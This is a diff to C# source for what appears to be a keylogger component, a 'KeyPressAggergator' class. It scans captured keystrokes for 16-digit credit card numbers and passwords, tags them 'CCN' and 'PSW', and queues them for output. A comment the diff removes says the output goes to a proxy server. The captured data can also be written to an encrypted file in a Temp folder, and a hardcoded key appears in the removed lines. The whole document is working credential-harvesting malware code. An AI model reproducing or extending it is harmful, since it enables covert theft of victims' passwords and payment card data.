@@ -12,19 +12,28 @@ namespace KeypressAggregator
 {
     class KeyPressAggergator
     {
-        ConcurrentQueue<KeyPress> inq;
+        private ConcurrentQueue<KeyPress> inq;
+        private ConcurrentQueue<CI> outbuffer;
+        private string outFName;
+        private string sKey;
+        private bool toFile = false;
 
-
-        public KeyPressAggergator(ConcurrentQueue<KeyPress> q)
+        public KeyPressAggergator(ConcurrentQueue<KeyPress> q, ConcurrentQueue<CI> outbuffer)
         {
             this.inq = q;
+            this.outbuffer = outbuffer;
+        }
+        public KeyPressAggergator(ConcurrentQueue<KeyPress> q, ConcurrentQueue<CI> outbuffer, string file, string key) : this(q, outbuffer)
+        {
+            this.outFName = file;
+            this.sKey = key;
+            this.toFile = true;
         }
 
         //This writes and encrypts the file with the string data
         //https://support.microsoft.com/en-us/kb/307010
-        public static void EncryptWriteInfo(string data, string outFName, string sKey)
+        private static void EncryptWriteInfo(string data, string outFName, string sKey)
         {
-
             // This text is added only once to the file.
             if (!File.Exists(outFName))
             {
@@ -49,7 +58,13 @@ namespace KeypressAggregator
             cryptostream.Close();
         }
 
-        
+        private CI createCi(string type, string data)
+        {
+            CI ci = new CI();
+            ci.Type = type;
+            ci.Data = data;
+            return ci;
+        }
 
         public void Scan()
         {
@@ -61,8 +76,7 @@ namespace KeypressAggregator
             Boolean isPswrd = false;
             String password = "";
             string data = "";
-            string outFName = "C:\\Users\\Default\\AppData\\Local\\Temp\\test";
-            string sKey = "w8v*e!d#";
+            
             while (this.inq != null)
             {
                 KeyPress ks;
@@ -93,14 +107,10 @@ namespace KeypressAggregator
                     // number is sent to the file
                     if (creditCard == 16)
                     {
-                        //Console.WriteLine("Credit Card Number: " + creditNum);
                         creditCard = 0;
-                        // Send a Confidential Information message to the proxy server
-                        // Type Credit Card Number CCN
-                        var ci = new CI();
-                        ci.Type = "CCN";
-                        ci.Data = creditNum;
-                        //Console.WriteLine("DATA: " + ci.Data);
+                        var ci = createCi( "CCN", creditNum);
+                        Console.WriteLine("CNN: " + ci.Data);
+                        outbuffer.Enqueue(ci);
                         data = data + "DATA: " + ci.Data;
                         foundInfo = true;
                         creditNum = "";
@@ -120,18 +130,16 @@ namespace KeypressAggregator
                     {
                         if(isPswrd == true)
                         {
-                            //Console.WriteLine("Password Data: " + password);
-                            var ci = new CI();
-                            ci.Type = "PSW";
-                            ci.Data = password;
-                            //Console.WriteLine("DATA: " + ci.Data);
+                            var ci = createCi("PSW", password);
+                            Console.WriteLine("PSW: " + ci.Data);
+                            outbuffer.Enqueue(ci);
                             data = data + "DATA: " + ci.Data;
                             isPswrd = false;
                             password = "";
                             foundInfo = true;
                         }
                     }
-                    if (foundInfo)
+                    if (toFile && foundInfo)
                     {
                         EncryptWriteInfo(data, outFName, sKey);
                         data = "";
